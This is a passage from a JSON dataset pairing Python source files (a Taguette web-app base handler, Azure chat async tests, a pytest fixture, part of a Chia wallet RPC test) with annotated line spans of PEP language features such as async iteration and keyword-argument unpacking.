https//:localhost:8765\")\nasyncio.get_event_loop().run_forever()",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        138,
                        172,
                        "async for",
                        "async for message in websocket:\n    if xml_validator(message, request_schema):\n      tree = et.ElementTree(et.fromstring(message))\n      format = tree.xpath('//format')[0].text\n      calltype = tree.xpath('//calltype')[0].text\n      if (calltype == 'acs'):\n          if (format == 'xml'):\n            response = find_all_courses(format)\n            for elem in response:\n              await websocket.send(elem)\n          else: \n            await websocket.send(str(find_all_courses(format)))\n      elif (calltype == 'sse'):\n        elem = tree.xpath('//element')[0].text\n        value = tree.xpath('//value')[0].text\n        if (elem == 'divers'):\n          path = helper.path_constructor_divers(value)\n        else: \n          path = helper.path_constructor_elem(elem, value) \n        await websocket.send(find_diverse_from_query(format, path, calltype))\n      elif (calltype == 'mcs'):\n        client_id = tree.xpath('//client')[0].text\n        path = helper.path_constructor_book(client_id)\n        await websocket.send(str(find_my_bookings(format, path)))\n      elif (calltype == 'bwg'):\n        client_id = tree.xpath('//client')[0].text\n        guid = tree.xpath('//guid')[0].text\n        try:\n          helper.add_kunde_to_course(guid, client_id)\n        except:\n          await websocket.send('Leider wurde die GUID nicht gefunden.')\n        else:\n          await websocket.send('Buchung erfolgreich!')\n    else:\n        await websocket.send('Falscher Request')"
                    ]
                ],
                "pep_498v": [
                    [
                        29,
                        29,
                        "%"
                    ],
                    [
                        61,
                        61,
                        "%"
                    ],
                    [
                        105,
                        105,
                        "%"
                    ]
                ]
            }
        },
        "150": {
            "file": "import asyncio\nimport bleach\nimport contextlib\nimport functools\nimport hashlib\nimport hmac\nimport json\nimport logging\nimport jinja2\nfrom markupsafe import Markup\nimport opentelemetry.trace\nimport os\nimport pkg_resources\nfrom prometheus_async.aio import time as prom_async_time\nimport prometheus_client\nimport redis.asyncio as aioredis\nimport signal\nimport smtplib\nfrom sqlalchemy.orm import joinedload, undefer\nimport tornado.ioloop\nfrom tornado.httpclient import AsyncHTTPClient\nimport tornado.locale\nimport tornado.iostream\nfrom tornado.web import HTTPError, RequestHandler\nfrom urllib.parse import urlencode\nfrom .. import __version__, exact_version\nfrom .. import database\nfrom ..utils import background_task\nlogger = logging.getLogger(__name__)\ntracer = opentelemetry.trace.get_tracer(__name__)\nPROM_DB_CONNECTIONS = prometheus_client.Gauge(\n    'database_connections',\n    \"Number of currently open database connections\",\n)\nPROM_EMAILS = prometheus_client.Counter(\n    'emails_sent',\n    \"Number of emails sent\",\n    labelnames=['type'],\n)\nPROM_EMAILS.labels('password_reset').inc(0)\nclass PseudoLocale(tornado.locale.Locale):\n    def __init__(self):\n        super().__init__('qps-ploc')\n    CHARS = {\n        'A': '\\u00c5', 'B': '\\u0181', 'C': '\\u00c7', 'D': '\\u00d0',\n        'E': '\\u00c9', 'F': '\\u0191', 'G': '\\u011c', 'H': '\\u0124',\n        'I': '\\u00ce', 'J': '\\u0134', 'K': '\\u0136', 'L': '\\u013b',\n        'M': '\\u1e40', 'N': '\\u00d1', 'O': '\\u00d6', 'P': '\\u00de',\n        'Q': '\\u01ea', 'R': '\\u0154', 'S': '\\u0160', 'T': '\\u0162',\n        'U': '\\u00db', 'V': '\\u1e7c', 'W': '\\u0174', 'X': '\\u1e8a',\n        'Y': '\\u00dd', 'Z': '\\u017d', 'a': '\\u00e5', 'b': '\\u0180',\n        'c': '\\u00e7', 'd': '\\u00f0', 'e': '\\u00e9', 'f': '\\u0192',\n        'g': '\\u011d', 'h': '\\u0125', 'i': '\\u00ee', 'j': '\\u0135',\n        'k': '\\u0137', 'l': '\\u013c', 'm': '\\u0271', 'n': '\\u00f1',\n        'o': '\\u00f6', 'p': '\\u00fe', 'q': '\\u01eb', 'r': '\\u0155',\n        's': '\\u0161', 't': '\\u0163', 'u': '\\u00fb', 'v': '\\u1e7d',\n        'w': '\\u0175', 'x': '\\u1e8b', 'y': '\\u00fd', 'z': '\\u017e',\n        ' ': '\\u2003',\n    }\n    @functools.lru_cache()\n    def mangle(self, text):\n        out = []\n        i = 0\n        while i < len(text):\n            if text[i] == '{' and text[i + 1] == '{':\n                j = i + 2\n                while text[j] != '}':\n                    j += 1\n                j += 1\n                out.append(text[i:j + 1])\n                i = j\n            elif text[i] == '%' and text[i + 1] == '(':\n                j = i + 2\n                while text[j] != ')':\n                    j += 1\n                j += 1\n                assert text[j] in 'srdf'\n                out.append(text[i:j + 1])\n                i = j\n            elif text[i] == '<':\n                j = i + 1\n                while text[j] != '>':\n                    j += 1\n                out.append(text[i:j + 1])\n                i = j\n            else:\n                out.append(self.CHARS.get(text[i], text[i]))\n            i += 1\n        return ''.join(out)\n    def translate(self, message, plural_message=None, count=None):\n        if plural_message is not None:\n            assert count is not None\n            return '[%s (n=%d)]' % (\n                self.mangle(plural_message),\n                count,\n            )\n        else:\n            assert count is None\n            return '[%s]' % self.mangle(message)\n    def pgettext(self, context, message, plural_message=None, count=None):\n        return self.translate(message, plural_message, count)\nclass GracefulExitApplication(tornado.web.Application):\n    def __init__(self, *args, **kwargs):\n        super(GracefulExitApplication, self).__init__(*args, **kwargs)\n        self.is_exiting = False\n        exit_time = os.environ.get('TORNADO_SHUTDOWN_TIME')\n        if exit_time:\n            exit_time = int(exit_time, 10)\n        else:\n            exit_time = 1  \n        def exit():\n            logger.info(\"Shutting down\")\n            tornado.ioloop.IOLoop.current().stop()\n        def exit_soon():\n            tornado.ioloop.IOLoop.current().call_later(exit_time, exit)\n        def signal_handler(signum, frame):\n            logger.info(\"Got SIGTERM, exiting\")\n            self.is_exiting = True\n            tornado.ioloop.IOLoop.current().add_callback_from_signal(exit_soon)\n        signal.signal(signal.SIGTERM, signal_handler)\n        signal.signal(signal.SIGINT, signal_handler)\nclass Application(GracefulExitApplication):\n    def __init__(self, handlers,\n                 config, **kwargs):\n        self.config = config\n        self.io_loop = asyncio.get_event_loop()\n        cookie_secret = config['SECRET_KEY']\n        super(Application, self).__init__(handlers,\n                                          cookie_secret=cookie_secret,\n                                          **kwargs)\n        d = pkg_resources.resource_filename('taguette', 'l10n')\n        tornado.locale.load_gettext_translations(d, 'taguette_main')\n        tornado.locale.set_default_locale(self.config['DEFAULT_LANGUAGE'])\n        self.DBSession = database.connect(config['DATABASE'])\n        self.event_waiters = {}\n        if config['REDIS_SERVER'] is not None:\n            self.redis = aioredis.Redis.from_url(config['REDIS_SERVER'])\n            self.redis_pubsub = self.redis.pubsub()\n            background_task(self._redis_reader(), should_never_exit=True)\n        else:\n            self.redis = self.redis_pubsub = None\n        if config['TOS_FILE']:\n            with open(config['TOS_FILE']) as fp:\n                self.terms_of_service = fp.read()\n        else:\n            self.terms_of_service = None\n        if config['MULTIUSER']:\n            self.single_user_token = None\n            logger.info(\"Starting in multi-user mode\")\n            if not self.terms_of_service:\n                logger.warning(\"No terms of service set\")\n        else:\n            self.single_user_token = hmac.new(\n                cookie_secret.encode('utf-8'),\n                b'taguette_single_user',\n                digestmod=hashlib.sha256,\n            ).hexdigest()\n        self.messages = []\n        self.messages_event = asyncio.Event()\n        self.check_messages()\n    async def _check_messages(self):\n        http_client = AsyncHTTPClient()\n        response = await http_client.fetch(\n            'https://msg.taguette.org/%s' % __version__,\n            headers={'Accept': 'application/json', 'User-Agent': 'Taguette'})\n        obj = json.loads(response.body.decode('utf-8'))\n        self.messages = [\n            {\n                'text': msg['text'],\n                'html': bleach.clean(\n                    msg['html'],\n                    tags=['a', 'br', 'strong', 'em'],\n                    attributes={'a': ['href', 'title']},\n                )\n            }\n            for msg in obj['messages']\n        ]\n        for msg in self.messages:\n            logger.warning(\"Taguette message: %s\", msg['text'])\n        self.messages_event.set()\n    @staticmethod\n    def _check_messages_callback(future):\n        try:\n            future.result()\n        except Exception:\n            logger.exception(\"Error getting messages\")\n    def check_messages(self):\n        f_msg = self.io_loop.create_task(self._check_messages())\n        f_msg.add_done_callback(self._check_messages_callback)\n        self.io_loop.call_later(86400,  \n                                self.check_messages)\n    async def _redis_reader(self):\n        await self.redis_pubsub.subscribe('_fixme')\n        async for message in self.redis_pubsub.listen():\n            if message['type'] == 'message':\n                data = message['data'].decode('utf-8')\n                cmd_json = json.loads(data)\n                project_id = cmd_json['project_id']\n                for future in self.event_waiters.pop(project_id, []):\n                    future.set_result(cmd_json)\n                await self.redis_pubsub.unsubscribe('project:%d' % project_id)\n    async def observe_project(self, project_id, future):\n        assert isinstance(project_id, int)\n        if project_id in self.event_waiters:\n            self.event_waiters[project_id].add(future)\n            return False\n        else:\n            self.event_waiters[project_id] = set((future,))\n            if self.redis is None:\n                return False\n            else:\n                await self.redis_pubsub.subscribe('project:%d' % project_id)\n                return True\n    def unobserve_project(self, project_id, future):\n        assert isinstance(project_id, int)\n        if project_id in self.event_waiters:\n            self.event_waiters[project_id].discard(future)\n            if not self.event_waiters[project_id]:\n                del self.event_waiters[project_id]\n                if self.redis is not None:\n                    background_task(self.redis_pubsub.unsubscribe(\n                        'project:%d' % project_id,\n                    ))\n    def notify_project(self, project_id, cmd):\n        assert isinstance(project_id, int)\n        cmd_json = cmd.to_json()\n        if self.redis is None:\n            for future in self.event_waiters.pop(project_id, []):\n                future.set_result(cmd_json)\n        else:\n            data = json.dumps(cmd_json, sort_keys=True, separators=(',', ':'))\n            background_task(self.redis.publish(\n                'project:%d' % project_id,\n                data.encode('utf-8)'),\n            ))\n    @tracer.start_as_current_span('send_mail')\n    def send_mail(self, msg):\n        config = self.config['MAIL_SERVER']\n        if config.get('ssl', False):\n            cls = smtplib.SMTP_SSL\n        else:\n            cls = smtplib.SMTP\n        with cls(config['host'], config.get('port', 25)) as smtp:\n            if 'user' in config or 'password' in config:\n                smtp.login(config['user'], config['password'])\n            smtp.send_message(msg)\n            PROM_EMAILS.labels('password_reset').inc()\n    def log_request(self, handler):\n        if handler.request.path == '/health' and handler.get_status() == 200:\n            return\n        if \"log_function\" in self.settings:\n            self.settings[\"log_function\"](handler)\n            return\n        access_log = logging.getLogger(\"tornado.access\")\n        if handler.get_status() < 400:\n            log_method = access_log.info\n        elif handler.get_status() < 500:\n            log_method = access_log.warning\n        else:\n            log_method = access_log.error\n        request_time = 1000.0 * handler.request.request_time()\n        log_method(\n            \"%d %s %.2fms (%s) lang=%s\",\n            handler.get_status(),\n            handler._request_summary(),\n            request_time,\n            handler.current_user,\n            handler.request.headers.get('Accept-Language'),\n        )\nclass HandleStreamClosed(RequestHandler):\n    def log_exception(self, typ, value, tb):\n        if isinstance(value, tornado.iostream.StreamClosedError):\n            return\n        super(HandleStreamClosed, self).log_exception(typ, value, tb)\n    def send_error(self, status_code=500, **kwargs):\n        if 'exc_info' in kwargs:\n            exception = kwargs['exc_info'][1]\n            if isinstance(exception, tornado.iostream.StreamClosedError):\n                return\n        super(HandleStreamClosed, self).send_error(status_code, **kwargs)\nclass BaseHandler(HandleStreamClosed, RequestHandler):\n    application: Application\n    template_env = jinja2.Environment(\n        loader=jinja2.FileSystemLoader(\n            [pkg_resources.resource_filename('taguette', 'templates')]\n        ),\n        autoescape=jinja2.select_autoescape(['html']),\n        extensions=['jinja2.ext.i18n'],\n    )\n    @jinja2.pass_context\n    def _tpl_static_url(context, path):\n        v = not context['handler'].application.settings.get('debug', False)\n        return context['handler'].static_url(path, include_version=v)\n    template_env.globals['static_url'] = _tpl_static_url\n    @jinja2.pass_context\n    def _tpl_reverse_url(context, path, *args):\n        return context['handler'].reverse_url(path, *args)\n    template_env.globals['reverse_url'] = _tpl_reverse_url\n    @jinja2.pass_context\n    def _tpl_xsrf_form_html(context):\n        return Markup(context['handler'].xsrf_form_html())\n    template_env.globals['xsrf_form_html'] = _tpl_xsrf_form_html\n    def __init__(self, application, request, **kwargs):\n        super(BaseHandler, self).__init__(application, request, **kwargs)\n        self._db = None\n        self._gettext = None\n    def set_default_headers(self):\n        self.set_header('Server', 'Taguette/%s' % exact_version())\n        self.set_header('X-Frame-Options', 'DENY')\n        self.set_header('Content-Security-Policy', \"frame-ancestors 'none';\")\n    @property\n    def db(self):\n        if self._db is None:\n            self._db = self.application.DBSession()\n            PROM_DB_CONNECTIONS.inc()\n        return self._db\n    def on_finish(self):\n        super(BaseHandler, self).on_finish()\n        self.close_db_connection()\n    def close_db_connection(self):\n        if self._db is not None:\n            self._db.close()\n            self._db = None\n            PROM_DB_CONNECTIONS.dec()\n    def gettext(self, message):\n        return self.locale.translate(message)\n    def ngettext(self, singular, plural, n):\n        return self.locale.translate(singular, plural, n)\n    def pgettext(\n        self,\n        context, message, plural_message=None,\n        n=None,\n    ):\n        return self.locale.pgettext(context, message, plural_message, n)\n    def get_current_user(self):\n        user = self.get_secure_cookie('user')\n        if user is not None:\n            user = self.db.query(database.User).get(user.decode('utf-8'))\n            if user is None or user.disabled:\n                return None\n            self.language = user.language\n            return user.login\n        else:\n            return None\n    def set_cookie(self, name, value, domain=None,\n                   expires=None, path='/', expires_days=None,\n                   *, dont_check=False,\n                   **kwargs):\n        if (\n            dont_check\n            or not self.application.config['COOKIES_PROMPT']\n            or self.get_cookie('cookies_accepted')\n            or self.get_cookie('user')\n        ):\n            return super(BaseHandler, self).set_cookie(name, value, **kwargs)\n        else:\n            self.redirect(\n                self.reverse_url('cookies_prompt') +\n                '?' +\n                urlencode(dict(next=self.request.uri)),\n            )\n            raise HTTPError(302)\n    if os.environ.get('TAGUETTE_TEST_LOCALE') == 'y':\n        _pseudolocale = PseudoLocale()\n        def get_user_locale(self):\n            return self._pseudolocale\n    else:\n        def get_user_locale(self):\n            if self.current_user is not None:\n                return tornado.locale.get(self.language)\n    def login(self, username):\n        logger.info(\"Logged in as %r\", username)\n        self.set_secure_cookie('user', username)\n    def logout(self):\n        logger.info(\"Logged out\")\n        self.clear_cookie('user')\n    def render_string(self, template_name, **kwargs):\n        extra_footer = self.application.config['EXTRA_FOOTER']\n        if not extra_footer:\n            extra_footer = self.gettext(\n                ' | Please report issues via '\n                + '<a href=\"https://gitlab.com/remram44/taguette\">GitLab</a> '\n                + 'or <a href=\"mailto:hi@taguette.org\">hi@taguette.org</a>!'\n            )\n        with tracer.start_as_current_span(\n            'render_template',\n            attributes={'template_name': template_name},\n        ):\n            template = self.template_env.get_template(template_name)\n            return template.render(\n                handler=self,\n                current_user=self.current_user,\n                multiuser=self.application.config['MULTIUSER'],\n                register_enabled=self.application.config[\n                    'REGISTRATION_ENABLED'\n                ],\n                tos=self.application.terms_of_service is not None,\n                extra_footer=extra_footer,\n                show_messages=self.current_user == 'admin',\n                version=exact_version(),\n                gettext=self.gettext,\n                ngettext=self.ngettext,\n                pgettext=self.pgettext,\n                base_path=self.application.config['BASE_PATH'],\n                **kwargs)\n    def get_project(self, project_id):\n        try:\n            project_id = int(project_id)\n        except ValueError:\n            raise HTTPError(404)\n        project_member = (\n            self.db.query(database.ProjectMember)\n            .options(joinedload(database.ProjectMember.project))\n            .get((project_id, self.current_user))\n        )\n        if project_member is None:\n            raise HTTPError(404)\n        return project_member.project, project_member.privileges\n    def get_document(self, project_id, document_id, contents=False):\n        try:\n            project_id = int(project_id)\n            document_id = int(document_id)\n        except ValueError:\n            raise HTTPError(404)\n        query = (\n            self.db.query(database.ProjectMember, database.Document)\n            .join(\n                database.Document,\n                database.Document.project_id == project_id,\n            )\n            .filter(database.Document.id == document_id)\n            .filter(database.ProjectMember.user_login == self.current_user)\n            .filter(database.ProjectMember.project_id == project_id)\n        )\n        if contents:\n            query = query.options(undefer(database.Document.contents))\n        res = query.one_or_none()\n        if res is None:\n            raise HTTPError(404)\n        member, document = res\n        return document, member.privileges\n    def redirect(self, url, permanent=False, status=None):\n        if status is None:\n            if permanent:\n                status = 301\n            elif self.request.method == 'GET':\n                status = 302\n            else:\n                status = 303\n        return super(BaseHandler, self).redirect(url, status=status)\n    def get_json(self):\n        type_ = self.request.headers.get('Content-Type', '')\n        if not type_.startswith('application/json'):\n            raise HTTPError(400, \"Expected JSON\")\n        try:\n            return json.loads(self.request.body.decode('utf-8'))\n        except json.JSONDecodeError:\n            raise HTTPError(400, \"Invalid JSON\")\n    def send_json(self, obj):\n        if isinstance(obj, list):\n            obj = {'results': obj}\n        elif not isinstance(obj, dict):\n            raise ValueError(\"Can't encode %r to JSON\" % type(obj))\n        self.set_header('Content-Type', 'application/json; charset=utf-8')\n        return self.finish(json.dumps(obj))\n    def send_error_json(self, status, message, reason=None):\n        self.set_status(status, reason)\n        return self.send_json({'error': message})\n    def write_error(self, status_code, **kwargs):\n        self.close_db_connection()\n        if self.settings.get('serve_traceback'):\n            super(BaseHandler, self).write_error(status_code, **kwargs)\n        elif status_code == 404:\n            self.render(\n                'error.html',\n                error_title=self.pgettext(\"page title\", \"Error 404\"),\n                error_message=self.gettext(\"This page does not exist.\"),\n            )\n        else:\n            self.render(\n                'error.html',\n                error_title=(\n                    self.pgettext(\"page title\", \"Error %d\")\n                    % status_code\n                ),\n                error_message=self._reason + \".\",\n            )\nclass PromMeasureRequest(object):\n    def __init__(self, count, time):\n        self.count = count\n        self.time = time\n    def _wrap(self, name, timer):\n        counter = self.count.labels(name)\n        timer = timer(self.time.labels(name))\n        counter.inc(0)\n        def decorator(func):\n            @contextlib.wraps(func)\n            def wrapper(*args, **kwargs):\n                counter.inc()\n                return func(*args, **kwargs)\n            return timer(wrapper)\n        return decorator\n    def sync(self, name):\n        return self._wrap(name, lambda metric: metric.time())\n    def async_(self, name):\n        return self._wrap(name, lambda metric: prom_async_time(metric))",
            "patterns": {
                "pep_468": [
                    [
                        104,
                        "super(GracefulExitApplication, self).__init__(*args, **kwargs)"
                    ],
                    [
                        128,
                        "super(Application, self).__init__(handlers,\n                                          cookie_secret=cookie_secret,\n                                          **kwargs)"
                    ],
                    [
                        280,
                        "super(HandleStreamClosed, self).send_error(status_code, **kwargs)"
                    ],
                    [
                        304,
                        "super(BaseHandler, self).__init__(application, request, **kwargs)"
                    ],
                    [
                        355,
                        "super(BaseHandler, self).set_cookie(name, value, **kwargs)"
                    ],
                    [
                        390,
                        "template.render(\n                handler=self,\n                current_user=self.current_user,\n                multiuser=self.application.config['MULTIUSER'],\n                register_enabled=self.application.config[\n                    'REGISTRATION_ENABLED'\n                ],\n                tos=self.application.terms_of_service is not None,\n                extra_footer=extra_footer,\n                show_messages=self.current_user == 'admin',\n                version=exact_version(),\n                gettext=self.gettext,\n                ngettext=self.ngettext,\n                pgettext=self.pgettext,\n                base_path=self.application.config['BASE_PATH'],\n                **kwargs)"
                    ],
                    [
                        472,
                        "super(BaseHandler, self).write_error(status_code, **kwargs)"
                    ],
                    [
                        500,
                        "func(*args, **kwargs)"
                    ]
                ],
                "pep_526": [
                    [
                        282,
                        "application: Application"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        194,
                        201,
                        "async for",
                        "async for message in self.redis_pubsub.listen():\n            if message['type'] == 'message':\n                data = message['data'].decode('utf-8')\n                cmd_json = json.loads(data)\n                project_id = cmd_json['project_id']\n                for future in self.event_waiters.pop(project_id, []):\n                    future.set_result(cmd_json)\n                await self.redis_pubsub.unsubscribe('project:%d' % project_id)"
                    ]
                ],
                "pep_498v": [
                    [
                        93,
                        96,
                        "%"
                    ],
                    [
                        99,
                        99,
                        "%"
                    ],
                    [
                        308,
                        308,
                        "%"
                    ],
                    [
                        164,
                        164,
                        "%"
                    ],
                    [
                        233,
                        233,
                        "%"
                    ],
                    [
                        463,
                        463,
                        "%"
                    ],
                    [
                        201,
                        201,
                        "%"
                    ],
                    [
                        212,
                        212,
                        "%"
                    ],
                    [
                        222,
                        222,
                        "%"
                    ]
                ]
            }
        },
        "151": {
            "file": "import pytest\nimport asyncio\nimport os\nfrom datetime import datetime\nfrom msrest.serialization import TZ_UTC\nfrom azure.communication.administration import CommunicationIdentityClient\nfrom azure.communication.chat.aio import (\n    ChatClient,\n    CommunicationUserCredential\n)\nfrom azure.communication.chat import (\n    ChatThreadMember,\n    ChatMessagePriority\n)\nfrom azure.communication.administration._shared.utils import parse_connection_str\nfrom azure_devtools.scenario_tests import RecordingProcessor\nfrom helper import URIIdentityReplacer\nfrom chat_e2e_helper import ChatURIReplacer\nfrom _shared.asynctestcase import AsyncCommunicationTestCase\nfrom _shared.testcase import BodyReplacerProcessor, ResponseReplacerProcessor\nclass ChatThreadClientTestAsync(AsyncCommunicationTestCase):\n    def setUp(self):\n        super(ChatThreadClientTestAsync, self).setUp()\n        self.recording_processors.extend([\n            BodyReplacerProcessor(keys=[\"id\", \"token\", \"senderId\", \"chatMessageId\", \"nextLink\", \"members\", \"multipleStatus\", \"value\"]),\n            URIIdentityReplacer(),\n            ResponseReplacerProcessor(keys=[self._resource_name]),\n            ChatURIReplacer()])\n        endpoint, _ = parse_connection_str(self.connection_str)\n        self.endpoint = endpoint\n        self.identity_client = CommunicationIdentityClient.from_connection_string(self.connection_str)\n        self.user = self.identity_client.create_user()\n        token_response = self.identity_client.issue_token(self.user, scopes=[\"chat\"])\n        self.token = token_response.token\n        self.new_user = self.identity_client.create_user()\n        self.chat_client = ChatClient(self.endpoint, CommunicationUserCredential(self.token))\n    def tearDown(self):\n        super(ChatThreadClientTestAsync, self).tearDown()\n        if not self.is_playback():\n            self.identity_client.delete_user(self.user)\n            self.identity_client.delete_user(self.new_user)\n    async def _create_thread(self):\n        topic = \"test topic\"\n        share_history_time = datetime.utcnow()\n        share_history_time = share_history_time.replace(tzinfo=TZ_UTC)\n        members = [ChatThreadMember(\n            user=self.user,\n            display_name='name',\n            share_history_time=share_history_time\n        )]\n        self.chat_thread_client = await self.chat_client.create_chat_thread(topic, members)\n        self.thread_id = self.chat_thread_client.thread_id\n    async def _send_message(self):\n        priority = ChatMessagePriority.NORMAL\n        content = 'hello world'\n        sender_display_name = 'sender name'\n        create_message_result = await self.chat_thread_client.send_message(\n            content,\n            priority=priority,\n            sender_display_name=sender_display_name)\n        self.message_id = create_message_result.id\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_update_thread(self):\n        async with self.chat_client:\n            await self._create_thread()\n            topic = \"update topic\"\n            async with self.chat_thread_client:\n                await self.chat_thread_client.update_thread(topic=topic)\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_send_message(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                priority = ChatMessagePriority.NORMAL\n                content = 'hello world'\n                sender_display_name = 'sender name'\n                create_message_result = await self.chat_thread_client.send_message(\n                    content,\n                    priority=priority,\n                    sender_display_name=sender_display_name)\n                self.assertTrue(create_message_result.id)\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_get_message(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                await self._send_message()\n                message = await self.chat_thread_client.get_message(self.message_id)\n                assert message.id == self.message_id\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_list_messages(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                await self._send_message()\n                if self.is_live:\n                    await asyncio.sleep(2)\n                chat_messages = self.chat_thread_client.list_messages(results_per_page=1)\n                items = []\n                async for item in chat_messages:\n                    items.append(item)\n                assert len(items) > 0\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_update_message(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                await self._send_message()\n                content = \"updated message content\"\n                await self.chat_thread_client.update_message(self.message_id, content=content)\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_delete_message(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                await self._send_message()\n                await self.chat_thread_client.delete_message(self.message_id)\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_list_members(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                chat_thread_members = self.chat_thread_client.list_members()\n                items = []\n                async for item in chat_thread_members:\n                    items.append(item)\n                assert len(items) == 1\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_add_members(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                share_history_time = datetime.utcnow()\n                share_history_time = share_history_time.replace(tzinfo=TZ_UTC)\n                new_member = ChatThreadMember(\n                        user=self.new_user,\n                        display_name='name',\n                        share_history_time=share_history_time)\n                members = [new_member]\n                await self.chat_thread_client.add_members(members)\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_remove_member(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                share_history_time = datetime.utcnow()\n                share_history_time = share_history_time.replace(tzinfo=TZ_UTC)\n                new_member = ChatThreadMember(\n                        user=self.new_user,\n                        display_name='name',\n                        share_history_time=share_history_time)\n                members = [new_member]\n                await self.chat_thread_client.add_members(members)\n                await self.chat_thread_client.remove_member(self.new_user)\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_send_typing_notification(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                await self.chat_thread_client.send_typing_notification()\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)\n    @pytest.mark.live_test_only\n    @AsyncCommunicationTestCase.await_prepared_test\n    async def test_send_read_receipt(self):\n        async with self.chat_client:\n            await self._create_thread()\n            async with self.chat_thread_client:\n                await self._send_message()\n                await self.chat_thread_client.send_read_receipt(self.message_id)\n            if not self.is_playback():\n                await self.chat_client.delete_chat_thread(self.thread_id)",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        110,
                        111,
                        "async for",
                        "async for item in chat_messages:\n                    items.append(item)"
                    ],
                    [
                        144,
                        145,
                        "async for",
                        "async for item in chat_thread_members:\n                    items.append(item)"
                    ]
                ]
            }
        },
        "152": {
            "file": "import asyncio\nimport pytest\nfrom concord.client import Client\n@pytest.fixture(scope=\"session\")\ndef event_loop():\n    loop = asyncio.get_event_loop()\n    yield loop\n@pytest.fixture(scope=\"module\")\n@pytest.mark.asyncio\nasync def client(event_loop):\n    client = Client(loop=event_loop)\n    yield client\n    await client.close()",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        10,
                        13,
                        "async generator",
                        "async def client(event_loop):\n    client = Client(loop=event_loop)\n    yield client\n    await client.close()"
                    ]
                ]
            }
        },
        "153": {
            "file": "import asyncio\nfrom chia.util.config import load_config, save_config\nimport logging\nfrom pathlib import Path\nimport pytest\nfrom chia.consensus.block_rewards import calculate_base_farmer_reward, calculate_pool_reward\nfrom chia.rpc.full_node_rpc_api import FullNodeRpcApi\nfrom chia.rpc.full_node_rpc_client import FullNodeRpcClient\nfrom chia.rpc.rpc_server import start_rpc_server\nfrom chia.rpc.wallet_rpc_api import WalletRpcApi\nfrom chia.rpc.wallet_rpc_client import WalletRpcClient\nfrom chia.simulator.simulator_protocol import FarmNewBlockProtocol\nfrom chia.types.peer_info import PeerInfo\nfrom chia.util.bech32m import encode_puzzle_hash\nfrom chia.consensus.coinbase import create_puzzlehash_for_pk\nfrom chia.wallet.derive_keys import master_sk_to_wallet_sk\nfrom chia.util.ints import uint16, uint32\nfrom chia.wallet.transaction_record import TransactionRecord\nfrom tests.setup_nodes import bt, setup_simulators_and_wallets, self_hostname\nfrom tests.time_out_assert import time_out_assert\nlog = logging.getLogger(\"heather.tests.wallet.rpc.test_wallet_rpc\")\nclass TestWalletRpc:\n    @pytest.fixture(scope=\"function\")\n    async def two_wallet_nodes(self):\n        async for _ in setup_simulators_and_wallets(1, 2, {}):\n            yield _\n    @pytest.mark.asyncio\n    async def test_wallet_make_transaction(self, two_wallet_nodes):\n        test_rpc_port = uint16(21529)\n        test_rpc_port_node = uint16(21530)\n        num_blocks = 5\n        full_nodes, wallets = two_wallet_nodes\n        full_node_api = full_nodes[0]\n        full_node_server = full_node_api.full_node.server\n        wallet_node, server_2 = wallets[0]\n        wallet_node_2, server_3 = wallets[1]\n        wallet = wallet_node.wallet_state_manager.main_wallet\n        wallet_2 = wallet_node_2.wallet_state_manager.main_wallet\n        ph = await wallet.get_new_puzzlehash()\n        ph_2 = await wallet_2.get_new_puzzlehash()\n        await server_2.start_client(PeerInfo(\"localhost\", uint16(full_node_server._port)), None)\n        for i in range(0, num_blocks):\n            await full_node_api.farm_new_transaction_block(FarmNewBlockProtocol(ph))\n        initial_funds = sum(\n            [calculate_pool_reward(uint32(i)) + calculate_base_farmer_reward(uint32(i)) for i in range(1, num_blocks)]\n        )\n        initial_funds_eventually = sum(\n            [\n                calculate_pool_reward(uint32(i)) + calculate_base_farmer_reward(uint32(i))\n                for i in range(1, 